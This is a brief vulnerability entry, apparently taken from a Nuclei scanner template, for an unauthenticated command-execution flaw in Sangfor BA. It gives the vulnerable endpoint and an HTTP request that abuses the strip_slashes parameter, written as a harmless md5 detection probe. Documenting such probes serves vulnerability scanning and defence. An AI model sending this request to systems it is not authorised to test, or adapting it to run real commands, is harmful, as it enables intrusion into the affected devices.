# Vulnerability: Sangfor BA - Remote Code Execution
**Classification:** CWE-78
**Source:** Nuclei Template (`sangfor-ba-rce.yaml`)

## Description
Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}
```

